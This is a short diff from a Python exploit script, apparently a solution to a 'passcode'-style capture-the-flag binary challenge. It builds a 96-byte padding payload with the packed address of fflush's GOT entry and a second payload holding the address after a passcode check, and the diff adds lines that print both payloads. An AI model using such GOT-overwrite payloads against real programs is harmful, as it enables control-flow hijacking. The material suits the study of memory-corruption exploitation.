@@ -7,6 +7,9 @@ padding = b'A'*96
 payload1 = padding + p32(fflushGOTaddress) 
 payload2 = str(addressAfterPasscodeCheck).encode()
 
+print(payload1.decode())
+print(payload2.decode())
+exit()
 #with open('payload','wb') as file:
 #    file.write(payload)
 
